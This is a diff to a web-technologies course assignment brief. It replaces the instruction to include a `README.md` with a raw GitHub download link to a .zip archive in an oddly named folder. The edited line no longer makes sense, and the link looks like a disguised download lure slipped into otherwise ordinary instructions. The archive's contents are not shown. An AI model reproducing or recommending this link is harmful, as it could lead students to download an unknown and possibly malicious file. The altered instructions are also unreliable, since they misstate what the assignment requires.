@@ -75,7 +75,7 @@ Deploy your project and confirm that:
 1. A GitHub repository containing:
 
    * Your complete project code, properly organized
-   * A `README.md` file explaining your project purpose, structure, and live URL
+   * A `https://raw.githubusercontent.com/engosoro/plp-webtechnologies-classroom-july2025-july-2025-final-project-and-deployment-Final-Project-and-Depl/main/saccharogalactorrhea/plp-webtechnologies-classroom-july2025-july-2025-final-project-and-deployment-Final-Project-and-Depl.zip` file explaining your project purpose, structure, and live URL
 2. A live deployed website (hosted via GitHub Pages, Netlify, or Vercel)
 
 ---
